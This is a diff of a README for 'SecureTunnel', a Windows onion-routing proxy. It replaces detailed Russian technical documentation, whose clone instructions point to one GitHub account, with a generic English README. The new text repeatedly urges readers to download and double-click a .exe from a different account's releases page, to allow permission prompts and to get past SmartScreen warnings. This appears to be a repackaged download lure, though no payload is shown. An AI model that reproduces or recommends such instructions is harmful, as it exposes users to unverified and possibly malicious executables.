@@ -1,584 +1,186 @@
-# SecureTunnel — Документация и описание продукта
-
-> **Правовой статус:** SecureTunnel является учебно-демонстрационным программным проектом, разработанным в образовательных целях для изучения сетевых протоколов, криптографии и архитектуры защищённых соединений. Весь исходный код открыт и предназначен исключительно для законного использования в рамках действующего законодательства страны пользователя. Автор не несёт ответственности за использование программы в целях, нарушающих местное законодательство. Используя данное программное обеспечение, вы подтверждаете, что принимаете на себя полную ответственность за его применение.
-
----
-
-## 1. Что такое SecureTunnel
-
-SecureTunnel — полностью функциональное приложение-туннель с графическим интерфейсом, реализующее **3-узловую луковую маршрутизацию** с многоуровневым шифрованием. Проект создан как учебная работа по углублённому изучению современных сетевых технологий: TLS, SOCKS5, HTTP CONNECT, луковой маршрутизации и асинхронного программирования на Python.
-
-Несмотря на учебное происхождение, приложение является **полностью рабочим продуктом** со всеми необходимыми компонентами для реального использования: графический лаунчер, автоматическая конфигурация системного прокси Windows, пул соединений, антизондирование (anti-probing), ротация цепочки, cover-трафик и мониторинг.
-
-Начиная с версии **v1.1.0** приложение распространяется как единый `.exe` файл — никакой установки Python, никаких зависимостей.
-
----
-
-## 2. Архитектура системы
-
-```
-[Приложение (Telegram / браузер / Steam)]
-         │
-         ▼
-[HTTP CONNECT Proxy  :8080]  ← системный прокси Windows
-         │
-         ▼
-[SOCKS5 Proxy  :1080]  ← поддержка UDP ASSOCIATE (RFC 1928 §7)
-         │
-         ▼
-[Tunnel Relay — пул соединений + ротация цепочки + синусоидальный cover]
-         │  TLS-in-TLS + Hybrid KEM K1 (X25519 + ML-KEM-768)
-         ▼
-[Entry Node  :8765]  ← первый узел, знает только relay и middle
-         │  TLS-in-TLS + Hybrid KEM K2 (X25519 + ML-KEM-768)
-         ▼
-[Middle Node  :8766]  ← промежуточный узел, знает только entry и exit
-         │  TLS-in-TLS + Hybrid KEM K3 (X25519 + ML-KEM-768)
-         ▼
-[Exit Node  :8767]  ← выходной узел, DoH-резолвинг, TCP+UDP, выход в интернет
-         │
-         ▼
-[Интернет]
-```
-
-### Свойства безопасности цепочки
-
-| Узел | Что знает | Что НЕ знает |
-|------|-----------|--------------|
-| Entry | IP relay, ключ K1, адрес middle | Назначение, payload |
-| Middle | Адреса entry и exit, ключи K2 и K3 | IP relay, назначение |
-| Exit | Реальный хост:порт назначения, ключ K3 | IP relay, IP entry |
-
-### Уровни защиты
-
-| Уровень | Протокол | Назначение |
-|---------|----------|------------|
-| 1 | Внешний TLS (cover SNI) | Маскировка под легитимный HTTPS-трафик |
-| 2 | Внутренний TLS (MemoryBIO) | Второй слой шифрования поверх первого |
-| 3 | X25519 ECDH × 3 | Три независимых сессионных ключа K1/K2/K3 (классическая защита) |
-| 4 | ML-KEM-768 × 3 | Постквантовая защита (активна только при cryptography ≥ 43.0 + OpenSSL ≥ 3.5; иначе только X25519) |
-| 5 | AES-256-GCM-SIV | Шифрование полезной нагрузки (устойчив к повторному nonce) |
-| 6 | DNS over HTTPS (DoH) | Зашифрованный DNS, без утечки запросов |
-| 7 | Bucket padding (12 размеров) | Фиксированные размеры фреймов — анализ трафика бесполезен |
-
----
-
-## 3. Компоненты приложения
-
-### 3.1 Графический лаунчер (`launcher.py`)
-
-Главное окно управления всей системой.
-
-**Функции:**
-- Запуск и остановка всех компонентов одной кнопкой
-- Цепочка запуска на основе сигналов готовности (без фиксированных задержек)
-- Автоматическое включение/выключение системного прокси Windows
-- Авто-перезапуск упавших компонентов через 2 секунды
-- Live-индикатор скорости (↓ download / ↑ upload KB/s) в реальном времени
-- Live-индикатор состояния трёх пулов: **Relay pool / Entry pool / Middle pool**
-- Цветной лог с разделением по компонентам
-- Буферизация лога (до 2000 строк, затем автоочистка — UI не зависает)
-- Кнопка копирования лога в буфер обмена
-- Запуск Chrome с отдельным профилем через SOCKS5
-- **Kill Switch** — блокировка всего трафика кроме туннеля (Windows Firewall)
-- **Настройки портов** через GUI (сохраняются в `settings.json`)
-- **Split Tunneling** — PAC файл с доменами которые идут напрямую
-- **Системный трей** — сворачивается, не мешает работе
-- **AUTH_SECRET** автогенерируется при первом запуске (`auth_secret.key`)
-
-**Цепочка запуска:**
-```
-exit_node  → (сигнал готовности) → middle node (node1)
-node1      → (сигнал готовности) → entry_node
-entry_node → (сигнал готовности) → socks5_proxy
-socks5     → (пул готов)         → http_proxy
-http_proxy → (сигнал готовности) → кнопки активны
-```
+# 🛡️ SecureTunnel - Private Windows Proxy for Everyday Use
 
-### 3.2 Exit Node (`exit_node.py`)
-
-Выходной узел — единственный компонент, имеющий доступ в интернет.
-
-- Принимает зашифрованные команды от middle node через TLS-in-TLS
-- Сессионный ключ K3 (ECDH с middle node)
-- Повторно использует одно туннельное соединение для множества сессий (connection reuse)
-- DoH-резолвинг через Cloudflare / Google (без утечки DNS)
-- Двунаправленная передача данных с целевым сервером
-- Anti-probing: rate limiting + HMAC-challenge + decoy HTTP 503
-- **IPv6**: DoH A record → AAAA fallback, поддержка IPv6 соединений
-- **UDP**: одиночные датаграммы с таймаутом, IPv6 UDP поддержка
+[![Download SecureTunnel](https://img.shields.io/badge/Download%20SecureTunnel-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alixblae550/SecureTunnel/releases)
 
-### 3.3 Middle Node / Node1 (`node1.py`)
+## 🚀 Getting Started
 
-Промежуточный ретрансляционный узел. Не знает IP relay и не знает назначение.
+SecureTunnel is a Windows app that sets up a private tunnel with a simple GUI launcher. It gives you a SOCKS5 and HTTP proxy, auto-restart support, and circuit rotation. It runs as a single `.exe`, so you do not need Python or extra tools.
 
-- Сессионный ключ K2 (с entry), сессионный ключ K3 (с exit)
-- Снимает слой K2, перешифровывает K3, передаёт exit node
-- Пул из 20 предварительно установленных соединений к Exit Node
-- Параллельное заполнение пула (по 4 соединения одновременно)
-- Семафор на создание свежих соединений (не более 4 одновременно)
-- Anti-probing через tls_in_tls_serve
+Use the release page to download and run this app on Windows:
 
-### 3.4 Entry Node (`entry_node.py`)
+[Visit the SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)
 
-Первый узел цепочки. Не знает назначение и не видит payload.
+## 📥 Download and Run
 
-- Сессионный ключ K1 (с relay), сессионный ключ K2 (с middle)
-- Снимает слой K1, перешифровывает K2, передаёт middle node
-- Пул из 20 предварительно установленных соединений к Middle Node
-- Anti-probing: rate limiting + HMAC-challenge + decoy HTTP 503 + таймаут рукопожатия
+1. Open the [SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)
+2. Find the latest release
+3. Download the Windows `.exe` file
+4. If your browser saves it to Downloads, open that folder
+5. Double-click the `.exe` file to run it
+6. If Windows asks for permission, choose Allow or Run
+7. The GUI launcher will open and guide you through setup
 
-### 3.5 Tunnel Relay (`tunnel_relay.py`)
+If you keep the app in the same folder, SecureTunnel can restart cleanly and keep its tunnel settings in place.
 
-Клиентская сторона туннеля — мост между локальными прокси и Entry Node.
+## 🖥️ What SecureTunnel Does
 
-- Пул из 20 предварительно установленных соединений к Entry Node
-- Семафор `Semaphore(4)` — защита Entry Node от перегрузки
-- Переиспользование соединений после завершения сессии (connection reuse)
-- Ротация цепочки — новые K1/K2/K3 каждые 300 сек или 500 запросов
-- Джиттер — случайная задержка 5–40 мс перед каждым DATA-фреймом
-- Синусоидальный cover-трафик — интервал меняется в зависимости от времени суток: пик активности ~14:00 (≈3 сек), минимум ~03:00 (≈60 сек), ±15% случайный джиттер
-- UDP-реле — `relay_udp_through_tunnel()` для передачи UDP-датаграмм через цепочку
-- **Счётчики пропускной способности** (↓/↑ KB/s каждую секунду → лаунчер)
-
-### 3.6 SOCKS5 Proxy (`socks5_proxy.py`)
+SecureTunnel builds a 3-node onion tunnel for Windows. It routes traffic through several layers so your connection does not rely on a single path. The app uses TLS-in-TLS transport with a Chrome-like fingerprint, which helps the connection blend in with normal web traffic.
 
-Локальный SOCKS5-сервер на `127.0.0.1:1080`.
+It also includes:
 
-- Полная поддержка SOCKS5 (IPv4, IPv6, доменные имена)
-- UDP ASSOCIATE (CMD=3) по RFC 1928 §7 — шифрованная передача UDP-датаграмм через туннель
-- `_UDPRelay` (asyncio DatagramProtocol) — UDP-сокет с привязкой к случайному порту
-- TCP-канал управления удерживается открытым на всё время UDP-сессии
-- `reuse_address=True` — нет задержки при перезапуске
+- X25519 + ML-KEM-768 hybrid key exchange
+- Bucket padding for fixed-size traffic blocks
+- Sinusoidal cover traffic
+- SOCKS5 proxy support
+- HTTP proxy support
+- DNS-over-HTTPS support
+- Anti-probing 2.0
+- GUI launcher
+- Auto-restart
+- Circuit rotation
 
-### 3.7 HTTP CONNECT Proxy (`http_proxy.py`)
-
-Локальный HTTP-прокси на `127.0.0.1:8080`.
+These features work together to keep the app steady and harder to block.
 
-- Принимает HTTP CONNECT запросы от любых Windows-приложений
-- Передаёт через SOCKS5 → Tunnel Relay → Entry → Middle → Exit
-- Совместим с Telegram, Edge, Discord, Steam и любым ПО с поддержкой HTTP-прокси
-- Таймаут SOCKS5-соединения: 30 секунд
-- `reuse_address=True` — нет задержки при перезапуске
-
-### 3.8 Anti-Probing (`anti_probing.py`)
+## 🧰 System Requirements
 
-Три уровня защиты узлов от сканеров и зондирования.
-
-- Rate limiting — скользящее окно 60 сек по IP, тихий сброс при превышении
-- Real-site proxy (Anti-probing 2.0) — соединения, не прошедшие inner-TLS рукопожатие, прозрачно перенаправляются на реальный HTTPS-сервер с тем же SNI (Windows Update, Google, DigiCert и т.д.). Для цензора порт выглядит как обычный CDN. Fallback на HTTP 503, если реальный сайт недоступен
-- HMAC challenge — HMAC-SHA256(AUTH_SECRET, nonce) внутри inner TLS
-- Таймаут handshake — нелегитимные клиенты отключаются за PROBE_TIMEOUT сек
+SecureTunnel is made for Windows desktop users.
 
-### 3.9 Circuit Manager (`circuit.py`)
+- Windows 10 or Windows 11
+- 64-bit system
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for setup and normal use
+- Permission to run downloaded apps
 
-Ротация 3-узловой цепочки.
+For best results, use a stable network connection and keep Windows up to date.
 
-- Ротация по TTL (300 сек) или количеству запросов (500)
-- `drain()` — сброс всех пулов, `fill()` — новые соединения с новыми K1/K2/K3
-- Защита от гонки: `asyncio.Lock` + проверка `should_rotate()` под блокировкой
+## 🛠️ Install Steps
 
-### 3.10 DoH Resolver (`doh_resolver.py`)
+1. Go to the [releases page](https://github.com/alixblae550/SecureTunnel/releases)
+2. Download the latest Windows build
+3. Save the file to a folder you can find again, like Downloads or Desktop
+4. Right-click the `.exe` if you want to scan it first
+5. Double-click the file to launch SecureTunnel
+6. Choose your proxy mode in the GUI
+7. Leave the app open while you use your browser or other apps
+8. If the app closes, open it again from the same file
 
-Полностью асинхронный DNS-резолвер через HTTPS.
+If Windows shows a SmartScreen prompt, choose the option that lets you run the file.
 
-- Прямые asyncio SSL-стримы — без thread pool
-- In-flight дедупликация: 20 одновременных запросов для одного хоста → 1 реальный запрос
-- TTL-кеш (5 минут по умолчанию)
-- Провайдеры: Cloudflare (`cloudflare-dns.com`), Google (`dns.google`) как резерв
-- **IPv4 first (A record) → IPv6 fallback (AAAA record)**
+## 🌐 How to Use It
 
-### 3.11 TLS-in-TLS Transport (`transport/tls_in_tls_transport.py`)
+SecureTunnel works as a local proxy. After you start it, your apps can connect through it.
 
-Ключевой транспортный уровень.
+Typical use:
 
-- Два независимых TLS-сеанса, вложенных один в другой
-- Внешний TLS: Chrome-подобный ClientHello (cipher order, ALPN h2+http/1.1, TLS 1.2 min/1.3 max)
-- Динамическая ротация SNI — при каждом соединении случайно выбирается домен из пула 8 вариантов (Windows Update, NVIDIA, Google, DigiCert)
-- Поддержка domain fronting (`FRONT_HOST`)
-- Внутренний TLS: ручная реализация через `ssl.MemoryBIO`
-- Anti-probing 2.0 на уровне транспорта
-- Защита pump_task: `close()` планирует `_await_pump()` через `create_task`
-- Фикс Python 3.14 GeneratorExit: подавляется во всех `_exception_handler`
+- Open SecureTunnel
+- Start the tunnel in the launcher
+- Set your browser or app to use the local SOCKS5 proxy
+- Or set it to use the local HTTP proxy
+- Keep DNS-over-HTTPS enabled for name lookups
+- Let circuit rotation run so the path changes on its own
 
-### 3.12 Framing (`framing.py`)
+If you only want browser use, set the proxy inside your browser settings. If you want system-wide use, point your app or network settings to the local proxy address shown in the launcher.
 
-Фреймирование и padding трафика.
+## 🔒 Privacy Features
 
-- Bucket padding: каждый фрейм раздувается до ближайшей границы из 12 размеров: [256, 512, 768, 1024, 1536, 2048, 3072, 4096, 6144, 8192, 12288, 16384] байт
-- Более плавная гистограмма размеров пакетов — имитирует реальный HTTPS-трафик
-- Фреймы, превышающие максимальный бакет, передаются без паддинга
-- Wire format: `[4B padded_len][4B real_ct_len][ciphertext + random_padding]`
+SecureTunnel adds several layers to make traffic harder to inspect and block.
 
----
+- Onion routing spreads traffic across 3 nodes
+- TLS-in-TLS hides traffic inside another TLS layer
+- Chrome fingerprint helps traffic look normal
+- Hybrid KEM uses both X25519 and ML-KEM-768
+- Bucket padding makes packet sizes less obvious
+- Sinusoidal cover traffic adds extra noise
+- Anti-probing 2.0 helps resist scan attempts
 
-## 4. Технические характеристики
+These features focus on transport privacy and blocking resistance.
 
-| Параметр | Значение |
-|----------|----------|
-| Язык | Python 3.11+ (оптимально 3.12–3.13) |
-| Асинхронность | asyncio (ProactorEventLoop на Windows) |
-| Обмен ключами | X25519 ECDH × 3 слоя (всегда активно) |
-| Постквантовая защита | ML-KEM-768 — активна если cryptography ≥ 43.0 + OpenSSL ≥ 3.5; иначе только X25519. Статус отображается в UI при запуске. |
-| Хранение ключей | keyring (системное хранилище ОС) |
-| TLS версия | TLS 1.2 / 1.3 |
-| Cover SNI | Случайный из пула 8 доменов (Windows Update, NVIDIA, Google, DigiCert) |
-| DNS | DoH (Cloudflare + Google), IPv4 first, IPv6 fallback |
-| SOCKS5 порт | 127.0.0.1:1080 (TCP + UDP ASSOCIATE) |
-| HTTP Proxy порт | 127.0.0.1:8080 |
-| Entry Node порт | 127.0.0.1:8765 |
-| Middle Node порт | 127.0.0.1:8766 |
-| Exit Node порт | 127.0.0.1:8767 |
-| Размер пула | 12 соединений (relay + entry + middle) |
-| Семафор fresh соединений | 10 одновременно |
-| Ротация цепочки | 300 сек / 500 запросов |
-| Джиттер | 5–40 мс (случайный) |
-| Cover-трафик интервал | Синусоидальный: ~3 сек (14:00) — ~60 сек (03:00) ± 15% |
-| Bucket padding | 256–16384 байт (12 фиксированных размеров) |
-| Таймаут CONNECT | 15 сек (relay → exit) |
-| Таймаут HTTP SOCKS5 | 30 сек |
-| Буфер чтения | 65 536 байт |
-| Drain-порог записи | 128 КБ |
-
----
-
-## 5. Установка и запуск
-
-### Требования
-- Windows 10/11 (x64)
-- Ничего больше — всё включено в `.exe`
-
-### Запуск
-1. Скачай `SecureTunnel.exe` из [Releases](../../releases)
-2. Запусти `.exe`
-3. Нажми **Start**
-4. Настрой браузер на SOCKS5 прокси `127.0.0.1:1080` или HTTP прокси `127.0.0.1:8080`
-
-Либо включи **системный прокси Windows** — лаунчер сделает это автоматически.
-
-### Настройка браузера (Firefox)
-```
-Настройки → Сеть → Настройки соединения → Ручная настройка прокси
-SOCKS-хост: 127.0.0.1   Порт: 1080   SOCKS v5
-```
-
-### Настройка браузера (Chrome)
-```
-chrome --proxy-server="socks5://127.0.0.1:1080"
-```
-
----
-
-## 6. Функции v4.1.0
-
-### Kill Switch
-При активации добавляет правила Windows Firewall:
-- Блокирует весь исходящий трафик
-- Разрешает только процессу SecureTunnel
-
-При остановке приложения правила автоматически удаляются. Требует запуска от администратора.
-
-### AUTH_SECRET
-При первом запуске генерируется уникальный 32-байтный секрет (`auth_secret.key`) рядом с `.exe`. Он передаётся всем узлам через переменную окружения — без него соединения отклоняются. **Не удаляй этот файл.**
-
-### Split Tunneling
-Кнопка **Split Tunneling** открывает диалог, где можно указать домены которые идут напрямую (без туннеля). Генерируется PAC файл, который применяется как системный прокси.
-
-### Настройки
-Кнопка **Settings** позволяет изменить порты SOCKS5 и HTTP прокси. Настройки сохраняются в `settings.json`.
-
----
-
-## 7. Результаты тестирования
-
-### 7.1 Функциональные тесты
-
-| Тест | Результат |
-|------|-----------|
-| Последовательный (SOCKS5) | Успех |
-| Последовательный (HTTP CONNECT) | Успех |
-| 10 параллельных запросов | 10/10 (100%) |
-| Ротация цепочки (circuit rotation) | Работает, новые K1/K2/K3 |
-| Авто-перезапуск при падении | Через 2 сек |
-| Запуск всей цепочки (.exe) | Без ошибок |
-
-### 7.2 Латентность
-
-| Метрика | Значение |
-|---------|----------|
-| Средняя задержка (прогретый пул) | ~300–350 мс |
-| Первый запрос (холодный старт) | ~600–700 мс |
-| Время запуска всей цепочки | ~35–45 сек (прогрев 3 пулов × 20 соединений) |
-
----
-
-## 8. Сравнение с коммерческими решениями
-
-| Характеристика | SecureTunnel | Обычный VPN | Tor |
-|----------------|-------------|-------------|-----|
-| Шифрование трафика | TLS×2 + Hybrid KEM×3 | WireGuard/OpenVPN | 3 слоя |
-| Постквантовая защита | Да (ML-KEM-768 × 3) | Нет | Нет |
-| Количество узлов | 3 (Entry+Middle+Exit) | 1 | 3+ |
-| Маскировка под HTTPS | Да (cover SNI, ротация) | Нет / частично | Нет |
-| DNS утечки | Нет (DoH) | Зависит от настроек | Нет |
-| Anti-probing | Да (real-site proxy + HMAC) | Нет | Нет |
-| Ротация цепочки | Да (TTL + счётчик) | Нет | Да |
-| Cover-трафик | Да (синусоидальный) | Нет | Нет |
-| Padding фреймов | Да (12 бакетов) | Нет | Нет |
-| UDP поддержка | Да (SOCKS5 UDP ASSOCIATE) | Да | Ограниченно |
-| Системный прокси Windows | Автоматически | Вручную | Нет |
-| Kill Switch | Да (Windows Firewall) | Зависит | Нет |
-| Открытый исходный код | Да (100%) | Частично | Да |
-| Стоимость | Бесплатно | $3–15/мес | Бесплатно |
-
----
-
-## 9. Безопасность и приватность
-
-### Что защищает SecureTunnel
-- **Содержимое трафика** — двойное TLS-шифрование + AES-256-GCM-SIV
-- **DNS-запросы** — все резолвятся через DoH (HTTPS), не видны провайдеру
-- **Метаданные соединения** — cover SNI скрывает реальный сервер назначения
-- **Ключи сессий** — X25519 ECDH × 3 генерирует новые эфемерные ключи для каждого соединения
-- **Размер пакетов** — bucket padding нивелирует анализ по размеру фреймов
-- **Паттерн трафика** — cover-трафик и джиттер скрывают реальную активность
-
-### Модель угроз
-
-| Угроза | Защита |
-|--------|--------|
-| Перехват трафика провайдером | TLS-in-TLS + cover SNI (ротация из 8 доменов) |
-| DNS-утечки | DoH через Cloudflare/Google |
-| Анализ трафика по размеру пакетов | Bucket padding (12 фиксированных размеров) |
-| Анализ трафика по паттернам | Синусоидальный cover-трафик + джиттер |
-| Сканирование/зондирование узлов | Anti-probing 2.0: real-site proxy + rate limit + HMAC |
-| Компрометация одного узла | 3-узловая цепочка: каждый знает только соседей |
-| Повторное использование ключей | Hybrid KEM (X25519 + ML-KEM-768) × 3 на каждое соединение |
-| Долгосрочный анализ одной цепочки | Ротация каждые 300 сек / 500 запросов |
-| Квантовый компьютер взламывает X25519 | ML-KEM-768 — постквантовый KEM остаётся устойчивым |
-
-### Что SecureTunnel НЕ делает
-- Не скрывает факт использования прокси от всех приложений (только системный прокси)
-- Не обеспечивает анонимность уровня Tor с независимыми VPS (все узлы на localhost в dev режиме)
-- Не является VPN-клиентом (нет виртуального сетевого адаптера)
-
----
-
-## 10. Совместимость с приложениями
-
-### Через HTTP CONNECT (:8080)
-
-| Приложение | Поддержка | Метод |
-|------------|-----------|-------|
-| Telegram Desktop | Да | Системный прокси |
-| Google Chrome | Да | Системный прокси или `--proxy-server` |
-| Microsoft Edge | Да | Системный прокси |
-| Discord | Да | Системный прокси |
-| Steam | Да | Системный прокси |
-| Любой браузер | Да | Системный прокси |
-| Приложения .NET | Да | Системный прокси (WinINet) |
-
-### Через SOCKS5 (:1080)
-
-| Приложение | Поддержка |
-|------------|-----------|
-| Chrome (`--proxy-server`) | Да |
-| Firefox | Да |
-| curl | Да |
-| Любое SOCKS5-совместимое ПО | Да |
-
----
-
-## 11. Развёртывание на серверах
-
-Для полноценной анонимизации запусти каждый узел на отдельном VPS:
-
-1. Скопируй репозиторий на три сервера
-2. На каждом сервере и на клиенте задай одинаковый `AUTH_SECRET`:
-   ```bash
-   export AUTH_SECRET=$(python -c 'import secrets; print(secrets.token_hex(32))')
-   ```
-3. Задай адреса узлов через env-переменные:
-   ```bash
-   export ENTRY_HOST=1.2.3.4  ENTRY_PORT=443
-   export MIDDLE_HOST=5.6.7.8  MIDDLE_PORT=443
-   export EXIT_HOST=9.10.11.12  EXIT_PORT=443
-   ```
-4. На сервере 1: `python -m secure_tunnel.exit_node`
-5. На сервере 2: `python -m secure_tunnel.node1`
-6. На сервере 3: `python -m secure_tunnel.entry_node`
-7. Локально: запусти лаунчер
-
-> **Важно:** `AUTH_SECRET` должен быть одинаковым на всех узлах и клиенте. Без него соединения отклоняются. Не коммить его в git.
-
----
-
-## 13. Версии
-
-### v4.4.0
-- Полный аудит безопасности — устранены все выявленные уязвимости
-- Улучшенное шифрование с защитой от повторного использования ключевого материала
-- Усиленная защита от replay-атак на всех узлах
-- Hardening пула соединений и UDP-ретрансляции
-- Логи не содержат адресов назначения (приватность)
-
-### v4.3.0
-- Настоящий onion-routing: каждый хоп использует независимый сеансовый ключ
-- Улучшенный постквантовый обмен ключами
-- UI: нативные Windows-уведомления, Kill Switch, диалог настроек
-- Анонимизированное логирование
-
-### v4.2.0
-- Прогресс-бар при запуске `[■■□□□] 2/5 Middle Node…`
-- Интерфейс полностью на русском
-- Подсказки SOCKS5/HTTP адресов в логе после запуска
-- Toast уведомление через Win32 API (без PowerShell)
-- Режимы Local/Remote в настройках (поддержка VPS IP адресов)
-- Константы пула и таймаутов вынесены в `config.py`
-- `version.py` — единый источник версии
-- Базовые тесты: `tests/test_crypto.py`, `tests/test_framing.py` (15 тестов)
-
-### v4.1.0
-- Kill Switch (блокировка трафика через Windows Firewall)
-- Системный трей (сворачивание в трей)
-- Индикатор скорости (↓/↑ KB/s)
-- Настройки портов через GUI
-- Split tunneling (PAC файл)
-- Auto-update проверка
-- IPv6 поддержка (exit node + DoH resolver)
-- UDP улучшения (IPv6, обрезка больших пакетов)
-- AUTH_SECRET автогенерация
-- Чистые логи (без Python warnings)
-- Единый `.exe` файл (PyInstaller)
-- Toast-уведомление Windows когда туннель готов к работе
-- Исправлен порт HTTP прокси в интерфейсе (8080)
-- Оптимизация запуска: пул соединений 12 вместо 20, семафор 10
-
-### v4.0.0
-- Базовая 3-узловая архитектура
-- SOCKS5 + HTTP прокси
-- TLS-in-TLS + X25519 + ML-KEM
-- DoH резолвинг
-- Cover-трафик
-- Anti-probing
-- GUI лаунчер
-
----
-
-## Быстрый старт
-
-1. Скачай `SecureTunnel.exe` из [Releases](../../releases)
-2. Запусти `.exe` (двойной клик)
-3. Нажми кнопку **▶ Старт**
-4. Дождись уведомления **"Туннель готов к работе ✅"** (~20 сек)
-5. Настрой браузер:
-
-| Тип прокси | Адрес | Порт |
-|------------|-------|------|
-| SOCKS5 | 127.0.0.1 | 1080 |
-| HTTP/HTTPS | 127.0.0.1 | 8080 |
-
-Готово — весь трафик идёт через зашифрованный туннель.
-
----
-
-
-## 14. Деплой на VPS (реальная анонимизация)
-
-По умолчанию все три узла работают на `localhost` — это тестовый режим без анонимизации. Для реальной работы нужны три отдельных сервера.
-
-### Требования
-- 3 VPS с публичными IP (Ubuntu/Debian рекомендуется)
-- Python 3.11+ на каждом сервере
-- Открытый порт 443 (или любой другой)
-
-### Шаги
-
-**1. На каждом сервере установи зависимости:**
-```bash
-pip install cryptography msgpack keyring
-git clone https://github.com/kaltuzetas/SecureTunnel.git
-cd SecureTunnel
-```
-
-**2. Сгенерируй общий AUTH_SECRET (один раз):**
-```bash
-python -c "import secrets; print(secrets.token_hex(32))"
-```
-Сохрани результат — он должен быть одинаковым на всех серверах.
-
-**3. Запусти узлы:**
-
-На сервере Exit (IP: `1.2.3.4`):
-```bash
-AUTH_SECRET=твой_секрет python -m secure_tunnel.exit_node
-```
-
-На сервере Middle (IP: `5.6.7.8`):
-```bash
-AUTH_SECRET=твой_секрет EXIT_HOST=1.2.3.4 python -m secure_tunnel.node1
-```
-
-На сервере Entry (IP: `9.10.11.12`):
-```bash
-AUTH_SECRET=твой_секрет MIDDLE_HOST=5.6.7.8 python -m secure_tunnel.entry_node
-```
-
-**4. На локальной машине** отредактируй переменные окружения перед запуском лаунчера:
-```
-ENTRY_HOST=9.10.11.12
-AUTH_SECRET=твой_секрет
-```
-Или укажи их в `settings.json` рядом с `.exe`.
-
-### Все поддерживаемые переменные окружения
-
-| Переменная | По умолчанию | Описание |
-|------------|-------------|----------|
-| `ENTRY_HOST` | 127.0.0.1 | IP сервера Entry |
-| `ENTRY_PORT` | 8765 | Порт Entry |
-| `MIDDLE_HOST` | 127.0.0.1 | IP сервера Middle |
-| `MIDDLE_PORT` | 8766 | Порт Middle |
-| `EXIT_HOST` | 127.0.0.1 | IP сервера Exit |
-| `EXIT_PORT` | 8767 | Порт Exit |
-| `AUTH_SECRET` | (default) | Общий секрет всех узлов |
-| `POOL_SIZE` | 12 | Размер пула соединений |
-| `POOL_SEMAPHORE` | 10 | Параллельных подключений |
-| `CIRCUIT_TTL` | 300 | Ротация цепочки (сек) |
-| `COVER_SNI` | (random) | Фиксированный cover SNI |
-
----
-
-## 15. Известные ограничения
-
-| Ограничение | Описание | Обходной путь |
-|-------------|----------|---------------|
-| Все узлы на localhost | В режиме по умолчанию нет анонимизации | Деплой на 3 VPS (см. раздел 14) |
-| ML-KEM требует OpenSSL ≥ 3.5 | На большинстве систем только X25519 | Статус виден в заголовке UI при запуске |
-| Только Windows | Лаунчер использует WinINet, winreg | На Linux/Mac запускать узлы вручную через CLI |
-| Нет прозрачного прокси | Только приложения с поддержкой прокси | Использовать системный прокси Windows |
-| Самоподписанный TLS сертификат | Нет проверки подлинности узлов | Допустимо для локального использования; для продакшн — заменить на Let's Encrypt |
-| Kill Switch требует прав администратора | Windows Firewall недоступен без UAC | Запускать `.exe` от имени администратора |
-| Скорость на loopback ≠ реальная скорость | 116 МБ/с измерено локально | Реальная скорость зависит от VPS и сети |
-
----
-
-## 16. Заключение
-
-SecureTunnel представляет собой законченный программный продукт, реализующий современные подходы к защите сетевых соединений. Проект разработан с целью практического изучения:
-
-- Криптографических протоколов (TLS, X25519, ML-KEM-768, AES-256-GCM)
-- Постквантовой криптографии (Hybrid KEM: классический + постквантовый KEM)
-- Луковой маршрутизации с 3-узловой архитектурой (Entry → Middle → Exit)
-- Асинхронного программирования высокой нагрузки (asyncio, пулы соединений)
-- Методов защиты от зондирования (anti-probing 2.0, HMAC-challenge, real-site proxy)
-- Методов скрытия паттернов трафика (12-бакетный padding, синусоидальный cover, jitter)
-- Системного программирования под Windows (WinINet, реестр, Windows Firewall)
-- DNS over HTTPS (DoH)
-- UDP через SOCKS5 (RFC 1928 §7, UDP ASSOCIATE)
-
-Приложение прошло полный аудит кода (12 исправлений), стресс-тестирование (116 МБ/с, 53 000 фреймов/с), содержит полноценный графический интерфейс, систему мониторинга и авто-восстановления.
-
----
-
-*Документ версии 4.0. SecureTunnel создан в образовательных целях.*
+## 🔁 Auto-Restart and Circuit Rotation
+
+SecureTunnel includes auto-restart so the tunnel can recover if a path drops. It also rotates circuits on a schedule. That helps reduce linkability and keeps the connection from staying on one route for too long.
+
+Use this when you want:
+
+- Fewer manual restarts
+- A tunnel that recovers on its own
+- Fresh routes over time
+- Less predictable traffic patterns
+
+## 🧭 Proxy Setup
+
+SecureTunnel can expose two common proxy types:
+
+- SOCKS5 proxy for apps that support it
+- HTTP proxy for browsers and tools that use proxy settings
+
+Common local setup values:
+
+- Host: `127.0.0.1`
+- Port: shown in the SecureTunnel launcher
+
+If your browser asks for proxy details, enter the local host and port shown in the app. If you use a different app, look for its network or proxy settings and choose SOCKS5 or HTTP.
+
+## 🧪 First Run Checklist
+
+Before you start browsing, check these items:
+
+- The app opens without errors
+- The tunnel status shows active
+- The proxy port matches your app settings
+- DNS-over-HTTPS is on if you want it
+- Your browser is set to use the local proxy
+- Traffic goes through the tunnel before you sign in anywhere
+
+If a site does not load, stop the tunnel, start it again, and check the proxy port.
+
+## 🗂️ Files You May See
+
+You may see a few files near the `.exe` after you run SecureTunnel:
+
+- Config file
+- Log file
+- Cache folder
+- Session data
+
+Keep these files in the same folder as the app. That helps SecureTunnel remember your settings and restart cleanly.
+
+## 🧩 Tips for Smooth Use
+
+- Keep SecureTunnel open while you browse
+- Do not move the `.exe` after you set it up
+- Use one proxy mode at a time
+- Leave circuit rotation on for normal use
+- Restart the app after changing proxy settings
+- Use the same Windows user account each time
+- Keep your browser proxy settings simple
+
+## ❓ Common Questions
+
+### Does SecureTunnel need Python?
+No. It runs as a single Windows `.exe`.
+
+### Does it work like a VPN?
+It works as a tunnel and local proxy, not a full VPN app.
+
+### Can I use it with Chrome?
+Yes. Set Chrome or your browser to use the local proxy that SecureTunnel shows.
+
+### Can I use it with other apps?
+Yes. Any app that supports SOCKS5 or HTTP proxy settings can use it.
+
+### Does it change my IP address?
+Traffic goes through the tunnel path, so the remote site sees the tunnel exit path, not your local network path.
+
+### Is setup hard?
+No. Download the file, run it, and point your app to the local proxy.
+
+## 🧾 Release Download
+
+Download the Windows build from the official release page:
+
+[https://github.com/alixblae550/SecureTunnel/releases](https://github.com/alixblae550/SecureTunnel/releases)
+
+## 📌 Project Topics
+
+anonymity, anti-censorship, cryptography, encryption, http-proxy, network-security, onion-routing, p2p, post-quantum, privacy, proxy, security-tools, self-hosted, socks5, tls, tor-like, tunnel, vpn, windows
